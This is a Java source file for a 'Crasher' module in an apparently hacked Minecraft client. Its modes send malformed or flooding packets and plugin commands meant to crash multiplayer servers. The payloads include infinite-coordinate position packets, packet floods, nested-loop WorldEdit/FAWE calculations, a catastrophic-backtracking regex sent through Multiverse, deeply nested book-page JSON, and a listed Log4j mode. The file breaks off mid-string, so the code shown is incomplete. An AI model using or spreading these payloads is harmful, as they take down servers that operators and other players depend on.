package dragonclient.module.impl.misc;

import java.util.Random;

import dragonclient.Dragon;
import dragonclient.event.Events.UpdateEvent;
import dragonclient.module.Category;
import dragonclient.module.Module;
import dragonclient.module.settings.DescriptionSetting;
import dragonclient.module.settings.ListSetting;
import dragonclient.util.PacketUtil;
import dragonclient.util.RandomUtil;
import io.netty.buffer.Unpooled;
import net.lax1dude.eaglercraft.EaglercraftRandom;
import net.minecraft.init.Items;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.CPacketKeepAlive;
import net.minecraft.network.play.client.CPacketPlayer;
import net.minecraft.network.play.client.CPacketHeldItemChange;
import net.minecraft.network.play.client.CPacketAnimation;
import net.minecraft.network.play.client.CPacketCloseWindow;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
import net.minecraft.network.play.client.CPacketTabComplete;
import net.minecraft.util.math.BlockPos;
import net.minecraft.network.play.client.CPacketClientStatus;
import net.minecraft.network.play.client.CPacketCustomPayload;
import net.minecraft.network.play.client.CPacketChatMessage;

public class Crasher extends Module {
    private DescriptionSetting description = new DescriptionSetting("Description", "Sends various packets to the server that can cause it to crash or kick you.");
    private ListSetting mode = new ListSetting("Mode", new String[] {"KeepAlive",
            "Swing",
            "PacketFuck",
            "Exceptioner",
            "ExploitFixer",
            "ChunkLoading",
            "WorldEdit",
            "FAWE",
            "MultiverseCore",
            "Essentials",
            "OnGround",
            "Pex",
            "AAC",
            "MemetrixOld",
            "WiredNCP",
            "BookEdit",
            "Name",
            "Reload",
            "Replay",
            "Exploit",
            "NullPointer",
            "NaN",
            "ItemSwitch",
            "ItemDrop",
            "CreativeItem",
            "MathOverFlow",
            "Zero",
            "ChatComplete",
            "Rotation",
            "Log4j" }, "KeepAlive");

    private ListSetting faweMode = new ListSetting("FAWE Mode", new String[] {"1", "2"}, "1", () -> {
        return mode.get().equals("FAWE");
    });

    private ListSetting aacMode = new ListSetting("AAC Mode", new String[] {"1", "2", "3", "4"}, "1", () -> {
        return mode.get().equals("AAC");
    });

    private ListSetting bookEditMode = new ListSetting("BEdit Mode", new String[] {"1", "2"}, "1", () -> {
        return mode.get().equals("BookEdit");
    });

    private ListSetting log4jMode = new ListSetting("Log4j Mode", new String[] {"Chat", "Command"}, "Chat", () -> {
        return mode.get().equals("Log4j");
    });

    public Crasher() {
        super("Crasher", Category.MISC);
        addSettings(description, mode, faweMode, aacMode, bookEditMode, log4jMode);
        Dragon.eventManager.registerListener(this, UpdateEvent.class);
    }
    
    @Override
    public void onEnable() {
        if (mc.player == null || mc.world == null) {
            return;
        }
        if (mc.isIntegratedServerRunning()) {
            Dragon.moduleManager.addChatMessage("You can't use this in singleplayer.");
            setEnabled(false);
            return;
        }
        Dragon.moduleManager.addChatMessage("Crashing...");

        switch (mode.get()) {
            case "PacketFuck":
                PacketUtil.sendPacketNoEvent(
                    new CPacketPlayer.Position(
                        mc.player.posX + Double.MAX_VALUE,
                        mc.player.posY + Double.MAX_VALUE,
                        mc.player.posZ + Double.MAX_VALUE,
                        true
                    )
                );
                PacketUtil.sendPacketNoEvent(
                    new CPacketPlayer.Position(
                        mc.player.posX + Double.NEGATIVE_INFINITY,
                        mc.player.posY + Double.NEGATIVE_INFINITY,
                        mc.player.posZ + Double.NEGATIVE_INFINITY,
                        true
                    )
                );
                PacketUtil.sendPacketNoEvent(
                    new CPacketPlayer.Position(
                        mc.player.posX + Double.POSITIVE_INFINITY,
                        mc.player.posY + Double.POSITIVE_INFINITY,
                        mc.player.posZ + Double.POSITIVE_INFINITY,
                        true
                    )
                );
                break;
            
            case "Exceptioner":
                PacketUtil.sendPacketNoEvent(
                    new CPacketClickWindow(
                        0,
                        -2,
                        0,
                        ClickType.PICKUP,
                        (ItemStack)null,
                        (short)1
                    )
                );
                break;

            case "ExploitFixer":
                for (int i = 0; i < 9999; i++) {
                    PacketUtil.sendPacketNoEvent(
                        new CPacketPlayer.Position(
                            mc.player.posX + 500000 * i,
                            mc.player.getEntityBoundingBox().minY + 500000 * i,
                            mc.player.posZ + 500000 * i, true
                        )
                    );
                }
                break;

            case "MassiveChunkLoading":
                double yPos = mc.player.posY;
                while (yPos < 255) {
                    PacketUtil.sendPacketNoEvent(
                        new CPacketPlayer.Position(
                            mc.player.posX,
                            yPos,
                            mc.player.posZ,
                            true
                        )
                    );
                    yPos += 5.0;
                }

                for (int i = 0; i < 1337 * 5; i++) {
                    PacketUtil.sendPacketNoEvent(
                        new CPacketPlayer.Position(
                            mc.player.posX + i,
                            255.0,
                            mc.player.posZ + i,
                            true
                        )
                    );
                    i += 5;
                }
                break;

            case "WorldEdit":
                mc.player.sendChatMessage("//calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<255;c++){}}}}");
                break;

            case "FAWE":
                if (faweMode.get().equals("1")) {
                    PacketUtil.sendPacketNoEvent(new CPacketTabComplete("/to for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}", null, false));
                } else {
                    PacketUtil.sendPacketNoEvent(new CPacketTabComplete("//calc for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){for(m=0;m<256;m++){ln(pi)}}}}}", null, false));
                }
                break;

            case "MultiverseCore":
                mc.player.sendChatMessage("/mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
                break;

            case "Essentials":
                mc.player.sendChatMessage("/pay * a a");
                break;

            case "OnGround":
                EaglercraftRandom random = new EaglercraftRandom();
                for (int i = 0; i < 3000; i++) {
                    PacketUtil.sendPacketNoEvent(new CPacketPlayer(random.nextBoolean()));
                }

            case "Pex":
                mc.player.sendChatMessage("/pex promote b b");
                break;

            case "AAC":
                if (aacMode.get().equals("1")) {
                    for (int i = 0; i < 10000; i++) {
                        PacketUtil.sendPacketNoEvent(
                            new CPacketPlayer.Position(
                                mc.player.posX + 9412 * i,
                                mc.player.getEntityBoundingBox().minY + 9412 * i,
                                mc.player.posZ + 9412 * i,
                                true
                            )
                        );
                    }
                } else if (aacMode.get().equals("2")) {
                    for (int i = 0; i < 10000; i++) {
                        PacketUtil.sendPacketNoEvent(
                            new CPacketPlayer.Position(
                                mc.player.posX + 500000 * i,
                                mc.player.getEntityBoundingBox().minY + 500000 * i,
                                mc.player.posZ + 500000 * i,
                                true
                            )
                        );
                    }
                } else if (aacMode.get().equals("3")) {
                    PacketUtil.sendPacketNoEvent(
                        new CPacketPlayer.Position(
                            mc.player.posX + Double.NEGATIVE_INFINITY,
                            mc.player.posY + Double.NEGATIVE_INFINITY,
                            mc.player.posZ + Double.NEGATIVE_INFINITY,
                            true
                        )
                    );
                }
                break;

            case "BookEdit":
                switch (bookEditMode.get()) {
                    case "1":
                        NBTTagCompound tag = new NBTTagCompound();
                        NBTTagList list = new NBTTagList();
                        for (int i = 0; i < 2; i++) {
                                list.appendTag(new NBTTagString(
                                    "{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}"
                                )
                            );
                        }

                        tag.setString("author", "AuthSmasher" + new EaglercraftRandom().nextInt(20));
                        tag.setString("title", "MojangIstToll" + new EaglercraftRandom().nextInt(20));
                        tag.setInteger("resolved", 1);
                        tag.setTag("pages", list);
                        ItemStack book = new ItemStack(Items.WRITABLE_BOOK);
                        book.setTagCompound(tag);
                        PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
                        buffer.writeItemStackToBuffer(book);
                        PacketUtil.sendPacketNoEvent(new CPacketCustomPayload("MC|BEdit", buffer));
                        break;
                    
                    case "2":
                        PacketBuffer pb = new PacketBuffer(Unpooled.buffer());
                        ItemStack item = new ItemStack(Items.WRITABLE_BOOK);
                        NBTTagCompound nbt = new NBTTagCompound();
                        NBTTagList pages = new NBTTagList();
                        NBTTagString page = new NBTTagString("a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a